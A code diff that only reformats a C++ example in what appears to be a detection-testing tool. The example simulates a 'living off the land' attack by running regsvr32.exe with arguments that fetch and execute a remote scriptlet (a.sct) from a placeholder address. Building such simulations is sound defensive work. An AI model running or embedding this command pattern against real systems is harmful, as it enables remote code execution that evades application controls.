@@ -10,9 +10,7 @@
 #include "Common.hpp"
 
 int wmain() {
-  std::wcout
-      << L"vigil lolbin_execution regsvr32 scriptlet-shaped simulation\n";
-  return vigil::examples::run_process(
-      vigil::examples::system32(L"regsvr32.exe"),
-      L"/s /n /u /i:http://192.0.2.1/a.sct scrobj.dll");
+   std::wcout << L"vigil lolbin_execution regsvr32 scriptlet-shaped simulation\n";
+   return vigil::examples::run_process(vigil::examples::system32(L"regsvr32.exe"),
+                                       L"/s /n /u /i:http://192.0.2.1/a.sct scrobj.dll");
 }
